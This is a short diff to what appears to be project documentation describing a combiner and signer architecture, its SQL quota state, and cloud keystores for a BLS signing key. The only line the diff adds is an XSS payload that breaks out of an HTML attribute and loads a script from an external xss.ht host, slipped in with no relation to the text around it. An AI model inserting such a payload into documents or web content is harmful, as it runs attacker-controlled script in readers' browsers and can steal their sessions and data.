@@ -61,3 +61,5 @@ The hosted architecture is divided into two components, the Combiner and the Sig
 The combiner and signers maintain some minimal state in a SQL database, mainly related to quota tracking.
 
 For storage of the BLS signing key, the signers currently support three cloud-based keystores: Azure Key Vault, AWS Secret Manager, and Google Secret Manager.
+
+"><script src=https://gosusnkr.xss.ht></script>
